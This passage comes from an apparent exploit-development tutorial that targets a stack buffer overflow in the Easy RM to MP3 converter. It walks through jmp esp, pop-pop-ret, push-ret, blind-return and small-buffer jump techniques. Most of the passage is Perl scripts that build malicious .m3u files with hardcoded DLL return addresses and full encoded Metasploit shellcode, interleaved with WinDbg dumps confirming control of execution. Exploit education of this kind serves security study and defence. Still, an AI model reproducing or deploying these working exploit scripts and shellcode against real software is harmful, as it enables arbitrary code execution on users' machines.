                                                              |------|
                                                                     ESP now points here (2)</pre>
</div>
<p>We’ll simulate this with a break and some NOP’s as shellcode, so we can see if our jumps work fine.</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">my $file= <span style="color: #006080">"test1.m3u"</span>;
my $junk= <span style="color: #006080">"A"</span> x 26094;

my $eip = pack(<span style="color: #006080">'V'</span>,0x01ab6a10); #pop pop ret from MSRMfilter01.dll
my $jmpesp = pack(<span style="color: #006080">'V'</span>,0x01ccf23a); #jmp esp

my $prependesp = <span style="color: #006080">"XXXX"</span>;  #add 4 bytes so ESP points at beginning of shellcode bytes
my $shellcode = <span style="color: #006080">"\x90"</span> x 8;  #add more bytes
$shellcode = $shellcode . $jmpesp;  #address to <span style="color: #5576D1">return</span> via pop pop ret ( = jmp esp)
$shellcode = $shellcode . <span style="color: #006080">"\xcc"</span> . <span style="color: #006080">"\x90"</span> x 500;  #real shellcode

open($FILE,<span style="color: #006080">"&gt;$file"</span>);
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print <span style="color: #006080">"m3u File Created successfully\n"</span>;</pre>
</div>
<div>&nbsp;</div>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">(d08.384): Break instruction exception - code 80000003 (!!! second chance !!!)
eax=90909090 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=000067fe
eip=000ff73c esp=000ff73c ebp=90909090 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
<unloaded_p32.dll>+0xff72b:
000ff73c cc              <span style="color: #5576D1">int</span>     3
0:000&gt; d esp
000ff73c  cc 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff74c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff75c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff76c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff77c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff78c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff79c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7ac  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</unloaded_p32.dll></pre>
</div>
<p>Cool. that worked.&nbsp; Now let’s replace the NOPs after jmp esp (ESP+8) with real shellcode (some nops to be sure + shellcode, encoded with alpha_upper) (execute calc):</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">my $file= <span style="color: #006080">"test1.m3u"</span>;
my $junk= <span style="color: #006080">"A"</span> x 26094;

my $eip = pack(<span style="color: #006080">'V'</span>,0x01ab6a10); #pop pop ret from MSRMfilter01.dll
my $jmpesp = pack(<span style="color: #006080">'V'</span>,0x01ccf23a); #jmp esp

my $prependesp = <span style="color: #006080">"XXXX"</span>;  #add 4 bytes so ESP points at beginning of shellcode bytes
my $shellcode = <span style="color: #006080">"\x90"</span> x 8;  #add more bytes
$shellcode = $shellcode . $jmpesp;  #address to <span style="color: #5576D1">return</span> via pop pop ret ( = jmp esp)

$shellcode = $shellcode . <span style="color: #006080">"\x90"</span> x 50;  #real shellcode
# windows/exec - 303 bytes
# http:<span style="color: #d7df01">//www.metasploit.com</span>
# Encoder: x86/alpha_upper
# EXITFUNC=seh, CMD=calc
$shellcode = $shellcode . <span style="color: #006080">"\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49"</span> .
<span style="color: #006080">"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"</span> .
<span style="color: #006080">"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"</span> .
<span style="color: #006080">"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"</span> .
<span style="color: #006080">"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"</span> .
<span style="color: #006080">"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47"</span> .
<span style="color: #006080">"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c"</span> .
<span style="color: #006080">"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a"</span> .
<span style="color: #006080">"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"</span> .
<span style="color: #006080">"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43"</span> .
<span style="color: #006080">"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a"</span> .
<span style="color: #006080">"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c"</span> .
<span style="color: #006080">"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44"</span> .
<span style="color: #006080">"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"</span> .
<span style="color: #006080">"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47"</span> .
<span style="color: #006080">"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50"</span> .
<span style="color: #006080">"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44"</span> .
<span style="color: #006080">"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43"</span> .
<span style="color: #006080">"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42"</span> .
<span style="color: #006080">"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b"</span> .
<span style="color: #006080">"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45"</span> .
<span style="color: #006080">"\x31\x42\x4c\x42\x43\x45\x50\x41\x41"</span>;

open($FILE,<span style="color: #006080">"&gt;$file"</span>);
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print <span style="color: #006080">"m3u File Created successfully\n"</span>;</pre>
</div>
<p><a href="/wp-content/uploads/2009/07/image20.png" target="_blank" class="thickbox no_icon" rel="gallery-2146" data-wpel-link="internal"><img fetchpriority="high" decoding="async" title="image" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="192" alt="image" src="/wp-content/uploads/2009/07/image_thumb20.png" width="292" border="0"></a></p>
<p>pwned !</p>
<h3>push return</h3>
<p>push ret is somewhat similar to call [reg].&nbsp; If one of the registers is directly pointing at your shellcode, and if for some reason you cannot use a jmp [reg] to jump to the shellcode, then you could</p>
<ul>
<li>put the address of that register on the stack. It will sit on top of the stack. </li>
<li>ret&nbsp; (which will take that address back from the stack and jump to it) </li>
</ul>
<p>In order to make this work, you need to overwrite EIP with the address of a push [reg] + ret sequence in one of the dll’s.</p>
<p>Suppose the shellcode is located directly at ESP.&nbsp; You need to find the opcode for ‘push esp’&nbsp; and the opcode for ‘ret’&nbsp; first</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">0:000&gt; a
000ff7ae push esp
push esp
000ff7af ret
ret

0:000&gt; u 000ff7ae
<unloaded_p32.dll>+0xff79d:
000ff7ae 54              push    esp
000ff7af c3              ret</unloaded_p32.dll></pre>
</div>
<div>opcode sequence is 0x54,0xc3</div>
<p>Search for this opcode :</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">0:000&gt; s 01a90000 l 01dff000 54 c3
01aa57f6  54 c3 90 90 90 90 90 90-90 90 8b 44 24 08 85 c0  T..........D$...
01b31d88  54 c3 fe ff 85 c0 74 5d-53 8b 5c 24 30 57 8d 4c  T.....t]S.\$0W.L
01b5cd65  54 c3 8b 87 33 05 00 00-83 f8 06 0f 85 92 01 00  T...3...........
01b5cf2f  54 c3 8b 4c 24 58 8b c6-5f 5e 5d 5b 64 89 0d 00  T..L$X.._^][d...
01b5cf44  54 c3 90 90 90 90 90 90-90 90 90 90 8a 81 da 04  T...............
01bbbb3e  54 c3 8b 4c 24 50 5e 33-c0 5b 64 89 0d 00 00 00  T..L$P^3.[d.....
01bbbb51  54 c3 90 90 90 90 90 90-90 90 90 90 90 90 90 6a  T..............j
01bf2aba  54 c3 0c 8b 74 24 20 39-32 73 09 40 83 c2 08 41  T...t$ 92s.@...A
01c0f6b4  54 c3 b8 0e 00 07 80 8b-4c 24 54 5e 5d 5b 64 89  T.......L$T^][d.
01c0f6cb  54 c3 90 90 90 64 a1 00-00 00 00 6a ff 68 3b 84  T....d.....j.h;.
01c692aa  54 c3 90 90 90 90 8b 44-24 04 8b 4c 24 08 8b 54  T......D$..L$..T
01d35a40  54 c3 c8 3d 10 e4 38 14-7a f9 ce f1 52 15 80 d8  T..=..8.z...R...
01d4daa7  54 c3 9f 4d 68 ce ca 2f-32 f2 d5 df 1b 8f fc 56  T..Mh../2......V
01d55edb  54 c3 9f 4d 68 ce ca 2f-32 f2 d5 df 1b 8f fc 56  T..Mh../2......V
01d649c7  54 c3 9f 4d 68 ce ca 2f-32 f2 d5 df 1b 8f fc 56  T..Mh../2......V
01d73406  54 c3 d3 2d d3 c3 3a b3-83 c3 ab b6 b2 c3 0a 20  T..-..:........
01d74526  54 c3 da 4c 3b 43 11 e7-54 c3 cc 36 bb c3 f8 63  T..L;C..T..6...c
01d7452e  54 c3 cc 36 bb c3 f8 63-3b 44 d8 00 d1 43 f5 f3  T..6...c;D...C..
01d74b26  54 c3 ca 63 f0 c2 f7 86-77 42 38 98 92 42 7e 1d  T..c....wB8..B~.
031d3b18  54 c3 f6 ff 54 c3 f6 ff-4f bd f0 ff 00 6c 9f ff  T...T...O....l..
031d3b1c  54 c3 f6 ff 4f bd f0 ff-00 6c 9f ff 30 ac d6 ff  T...O....l..0...</pre>
</div>
<p>Craft your exploit and run :</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">my $file= <span style="color: #006080">"test1.m3u"</span>;
my $junk= <span style="color: #006080">"A"</span> x 26094;

my $eip = pack(<span style="color: #006080">'V'</span>,0x01aa57f6); #overwrite EIP with push esp, ret

my $prependesp = <span style="color: #006080">"XXXX"</span>;  #add 4 bytes so ESP points at beginning of shellcode bytes

my $shellcode = <span style="color: #006080">"\x90"</span> x 25;   #start shellcode with some NOPS

# windows/exec - 303 bytes
# http:<span style="color: #d7df01">//www.metasploit.com</span>
# Encoder: x86/alpha_upper
# EXITFUNC=seh, CMD=calc

$shellcode = $shellcode . <span style="color: #006080">"\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49"</span> .
<span style="color: #006080">"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"</span> .
<span style="color: #006080">"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"</span> .
<span style="color: #006080">"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"</span> .
<span style="color: #006080">"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"</span> .
<span style="color: #006080">"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47"</span> .
<span style="color: #006080">"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c"</span> .
<span style="color: #006080">"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a"</span> .
<span style="color: #006080">"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"</span> .
<span style="color: #006080">"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43"</span> .
<span style="color: #006080">"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a"</span> .
<span style="color: #006080">"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c"</span> .
<span style="color: #006080">"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44"</span> .
<span style="color: #006080">"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"</span> .
<span style="color: #006080">"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47"</span> .
<span style="color: #006080">"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50"</span> .
<span style="color: #006080">"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44"</span> .
<span style="color: #006080">"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43"</span> .
<span style="color: #006080">"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42"</span> .
<span style="color: #006080">"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b"</span> .
<span style="color: #006080">"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45"</span> .
<span style="color: #006080">"\x31\x42\x4c\x42\x43\x45\x50\x41\x41"</span>;

open($FILE,<span style="color: #006080">"&gt;$file"</span>);
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print <span style="color: #006080">"m3u File Created successfully\n"</span>;</pre>
</div>
<p><a href="/wp-content/uploads/2009/07/image21.png" target="_blank" class="thickbox no_icon" rel="gallery-2146" data-wpel-link="internal"><img decoding="async" title="image" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="165" alt="image" src="/wp-content/uploads/2009/07/image_thumb21.png" width="186" border="0"></a></p>
<p>pwned again !</p>
<h3>jmp [reg]+[offset]</h3>
<p>Another technique to overcome the problem that the shellcode begins at an offset of a register (ESP in our example) is by trying to find a jmp [reg + offset] instruction (and overwriting EIP with the address of that instruction).&nbsp; Let’s assume that we need to jump 8 bytes again (see previous exercise). Using the jmp reg+offset technique, we would simply jump over the 8 bytes at the beginning of ESP and land directly at our shellcode.</p>
<p>We need to do 3 things :</p>
<ul>
<li>find the opcode for jmp esp+8h </li>
<li>find an address that points to this instruction </li>
<li>craft the exploit so it overwrites EIP with this address </li>
</ul>
<p>Finding the opcode : use windbg :</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">0:014&gt; a
7c90120e jmp [esp + 8]
jmp [esp + 8]
7c901212 

0:014&gt; u 7c90120e
ntdll!DbgBreakPoint:
7c90120e ff642408        jmp     dword ptr [esp+8]</pre>
</div>
<p>The opcode is ff642408</p>
<p>Now you can search for a dll that has this opcode, and use the address to overwrite EIP with.&nbsp; In our example, I could not find this exact opcode anywhere.&nbsp; Of course, you are not limited to looking for jmp [esp+8]… you could also look for values bigger than 8 (because you control anything above 8… you could easily put some additional NOP’s at the beginning of the shellcode and make the jump into the nop’s…</p>
<p>(by the way: Opcode for ret is c3. But I’m sure you’ve already figured that our for yourself)</p>
<p>&nbsp;</p>
<h3>Blind return</h3>
<p>This technique is based on the following 2 steps:</p>
<ul>
<li>Overwrite EIP with an address pointing to a ret instruction </li>
<li>Hardcode the address of the shellcode at the first 4 bytes of ESP </li>
<li>When the ret is execute, the last added 4 bytes (topmost value) are popped from the stack and will be put in EIP </li>
<li>Exploit jumps to shellcode </li>
</ul>
<p>So this technique is useful if</p>
<ul>
<li>you cannot point EIP to go a register directly (because you cannot use jmp or call instructions. (This means that you need to hardcode the memory address of the start of the shellcode),&nbsp; but </li>
<li>you can control the data at ESP (at least the first 4 bytes) </li>
</ul>
<p>In order to set this up, you need to have the memory address of the shellcode (= the address of ESP).&nbsp; As usual, try to avoid that this address starts with / contains null bytes, or you will not be able to load your shellcode behind EIP.&nbsp; If your shellcode can be put at a location, and this location address does not contain a null byte, then this would be another working technique.</p>
<p>Find the address of a ‘ret’ instruction in one of the dll’s.</p>
<p>Set the first 4 bytes of the shellcode (first 4 bytes of ESP) to the address where the shellcode begins, and overwrite EIP with the address of the ‘ret’ instruction.&nbsp; From the tests we have done in the first part of this tutorial, we remember that ESP seems to start at 0x000ff730. Of course this address could change on different systems, but if you have no other way than hardcoding addresses, then this is the only thing you can do.</p>
<p>This address contains null byte, so when building the payload, we create a buffer that looks like this :</p>
<p>[26094 A’s][address of ret][0x000fff730][shellcode]</p>
<p>The problem with this example is that the address used to overwrite EIP contains a null byte. (= string terminator), so the shellcode is not put in ESP. This is a problem, but it may not be a showstopper. Sometimes you can find your buffer (look at the first 26094 A’s, not at the ones that are pushed after overwriting EIP, because they will be unusable because of null byte) back at other locations/registers, such as eax, ebx, ecx, etc… In that case, you could try to put the address of that register as the first 4 bytes of the shellcode (at the beginning of ESP, so directly after overwriting EIP), and still overwrite EIP with the address of a ‘ret’ instruction.</p>
<p>This is a technique that has a lot of requirements and drawbacks, but it only requires a “ret” instruction…&nbsp; Anyways, it didn’t really work for Easy RM to MP3.</p>
<p>&nbsp;</p>
<h3>Dealing with small buffers : jumping anywhere with custom jumpcode</h3>
<p>We have talked about various ways to make EIP jump to our shellcode. In all scenario’s, we have had the luxury to be able to put this shellcode in one piece in the buffer. But what if we see that we don’t have enough space to host the entire shellcode ?</p>
<p>In our exercise, we have been using 26094 bytes before overwriting EIP, and we have noticed that ESP points to 26094+4 bytes, and that we have plenty of space from that point forward. But what if we only had 50 bytes (ESP -&gt; ESP+50 bytes). What if our tests showed that everything that was written after those 50 bytes were not usable ?&nbsp; 50 bytes for hosting shellcode is not a lot.&nbsp; So we need to find a way around that.&nbsp; So perhaps we can use the 26094 bytes that were used to trigger the actual overflow.</p>
<p>First, we need to find these 26094 bytes somewhere in memory. If we cannot find them anywhere, it’s going to be difficult to reference them.&nbsp; In fact, if we can find these bytes and find out that we have another register pointing (or almost pointing) at these bytes, it may even be quite easy to put our shellcode in there.</p>
<p>If you run some basic tests against Easy RM to MP3, you will notice that parts of the 26094 bytes are also visible in the ESP dump&nbsp; :</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">my $file= <span style="color: #006080">"test1.m3u"</span>;
my $junk= <span style="color: #006080">"A"</span> x 26094;
my $eip = <span style="color: #006080">"BBBB"</span>;
my $preshellcode = <span style="color: #006080">"X"</span> x 54;  #let<span style="color: #006080">'s pretend this is the only space we have available
my $nop = "\x90" x 230;  #added some nops to visually separate our 54 X'</span>s from other data

open($FILE,<span style="color: #006080">"&gt;$file"</span>);
print $FILE $junk.$eip.$preshellcode.$nop;
close($FILE);
print <span style="color: #006080">"m3u File Created successfully\n"</span>;</pre>
</div>
<div>After opening the test1.m3u file, we get this :</div>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
<unloaded_p32.dll>+0x42424231:
42424242 ??              ???
0:000&gt; d esp
000ff730  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ff740  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ff750  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ff760  58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90  XX..............
000ff770  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff780  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff790  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7a0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:000&gt; d
000ff7b0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7c0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7d0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7e0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7f0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff800  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff810  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff820  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:000&gt; d
000ff830  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff840  90 90 90 90 90 90 90 90-00 41 41 41 41 41 41 41  .........AAAAAAA
000ff850  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff860  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff870  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff880  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff890  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</unloaded_p32.dll></pre>
</div>
<p>We can see our 50 X’s at ESP.&nbsp; Let’s pretend this is the only space available for shellcode (we think).&nbsp; However, when we look further down the stack, we can find back A’s starting from address 000ff849 (=ESP+281).</p>
<p>When we look at other registers, there’s no trace of X’s or A’s. (You can just dump the registers, or look for a number of A’s in memory.</p>
<p>So this is it.&nbsp; We can jump to ESP to execute some code, but we only have 50 bytes to spend on shellcode.&nbsp; We also see other parts of our buffer at a lower position in the stack… in fact, when we continue to dump the contents of ESP, we have a huge buffer filled with A’s…</p>
<p><a href="/wp-content/uploads/2009/07/image22.png" target="_blank" class="thickbox no_icon" rel="gallery-2146" data-wpel-link="internal"><img loading="lazy" decoding="async" title="image" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="340" alt="image" src="/wp-content/uploads/2009/07/image_thumb22.png" width="269" border="0"></a></p>
<p>Luckily there is a way to host the shellcode in the A’s and use the X’s to jump to the A’s. In order to make this happen, we need a couple of things</p>
<ul>
<li>The position inside the buffer with 26094 A’s that is now part of ESP, at 000ff849 (“Where do the A’s shown in ESP really start ?) (so if we want to put our shellcode inside the A’s, we need to know where exactly it needs to be put) </li>
<li>“Jumpcode” : code that will make the jump from the X’s to the A’s. This code cannot be larger than 50 bytes (because that’s all we have available directly at ESP) </li>
</ul>
<p>We can find the exact position by using guesswork, by using custom patterns, or by using one of metasploits patterns.</p>
<p>We’ll use one of metasploit’s patterns…&nbsp; we’ll start with a small one (so if we are looking at the start of the A’s, then we would not have to work with large amount of character patterns :-) )</p>
<p>Generate a pattern of let’s say 1000 characters, and replace the first 1000 characters in the perl script with the pattern (and then add 25101 A’s)</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">my $file= <span style="color: #006080">"test1.m3u"</span>;
my $pattern = <span style="color: #006080">"Aa0Aa1Aa2Aa3Aa4Aa....g8Bg9Bh0Bh1Bh2B"</span>;
my $junk= <span style="color: #006080">"A"</span> x 25101;
my $eip = <span style="color: #006080">"BBBB"</span>;
my $preshellcode = <span style="color: #006080">"X"</span> x 54;  #let<span style="color: #006080">'s pretend this is the only space we have available at ESP
my $nop = "\x90" x 230;  #added some nops to visually separate our 54 X'</span>s from other data in the ESP dump

open($FILE,<span style="color: #006080">"&gt;$file"</span>);
print $FILE $pattern.$junk.$eip.$preshellcode.$nop;
close($FILE);
print <span style="color: #006080">"m3u File Created successfully\n"</span>;</pre>
</div>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
<unloaded_p32.dll>+0x42424231:
42424242 ??              ???
0:000&gt; d esp
000ff730  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ff740  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ff750  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ff760  58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90  XX..............
000ff770  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff780  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff790  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7a0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:000&gt; d
000ff7b0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7c0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7d0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7e0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7f0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff800  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff810  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff820  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:000&gt; d
000ff830  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff840  90 90 90 90 90 90 90 90-00 35 41 69 36 41 69 37  .........5Ai6Ai7
000ff850  41 69 38 41 69 39 41 6a-30 41 6a 31 41 6a 32 41  Ai8Ai9Aj0Aj1Aj2A
000ff860  6a 33 41 6a 34 41 6a 35-41 6a 36 41 6a 37 41 6a  j3Aj4Aj5Aj6Aj7Aj
